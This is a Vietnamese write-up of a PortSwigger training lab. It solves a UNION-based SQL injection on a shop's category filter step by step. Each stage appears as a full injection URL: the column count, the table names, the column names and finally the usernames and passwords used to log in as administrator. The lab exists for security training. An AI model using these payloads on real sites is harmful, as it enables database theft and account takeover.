# Lab: SQL injection attack, listing the database contents on non-Oracle databases

### Link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
![Require of Lab](/Images/sql9.1.png)

Yêu cầu của bài lab là đăng nhập bằng thông tin của user `administrator`

Truy cập vào bài lab ta thấy đây là 1 website bán hàng, với từng danh mục như `Corporate gifts`, `Food & Drink`, `Gifts` và `Lifestyle`, `Pets`....
![Website](/Images/sql9.2.png)

Bước đầu tiên để giải quyết bài lab, ta phải xác định số cột được trả về là bao nhiêu. 
Sau khi tăng dần vị trí tương đối lên đến 3 thì thấy thông báo lỗi, do đó ta xác định được số cột được trả về là 2
> https://ac5c1f911f9b4788c018152c006b0057.web-security-academy.net/filter?category=Lifestyle`'+ORDER+BY+3--`

![Error of query](/Images/sql9.3.png)

Tiếp theo, là xác định từng cột trả về có chứa văn bản hay không.
Ta kiểm tra từng cột được trả về bằng cách chèn một vài ký tự trong từng cột và xem phản hồi
> https://ac5c1f911f9b4788c018152c006b0057.web-security-academy.net/filter?category=Lifestyle`'+UNION+SELECT+'abc',NULL--`

![Check column](/Images/sql9.4.png)

> https://ac5c1f911f9b4788c018152c006b0057.web-security-academy.net/filter?category=Lifestyle`'+UNION+SELECT+NULL,'abc'--`

![Check column](/Images/sql9.5.png)

Sau khi xác định các cột đều chứa văn bản, ta tiến hành lấy thông tin của các bảng có trong dtb như sau
> https://ac5c1f911f9b4788c018152c006b0057.web-security-academy.net/filter?category=Lifestyle`'+UNION+SELECT+TABLE_NAME,+NULL+FROM+information_schema.tables--`

![All tables](/Images/sql9.6.png)
Sau khi có được toàn bộ bảng có trong dtb, ta thấy có một bảng tên là `users_gfswkw` là bảng chứa các thông tin của user, bây giờ ta sẽ đi lấy thông tin của các cột có trong bảng `users_gfswkw` này
> https://ac5c1f911f9b4788c018152c006b0057.web-security-academy.net/filter?category=Lifestyle`'+UNION+SELECT+COLUMN_NAME,+NULL+FROM+information_schema.columns+WHERE+table_name%20='users_gfswkw'--`

![All column](/Images/sql9.7.png)

Đã có được thông tin của các cột trong bảng chứa thông tin user, thì ta sẽ tiến hành lấy thông tin của các user thông qua các cột usename và password
> https://ac5c1f911f9b4788c018152c006b0057.web-security-academy.net/filter?category=Lifestyle`'+UNION+SELECT+password_sojzpw,+username_ixwvfz+FROM+users_gfswkw--`

![All user](/Images/sql9.8.png)

Để hoàn thành bài lab, ta dùng thông tin của user `administrator` để đăng nhập vào website
![Result](/Images/sql9.9.png)


<div align="right"> <i> Ngày 22 tháng 01 năm 2022 </i> </div>
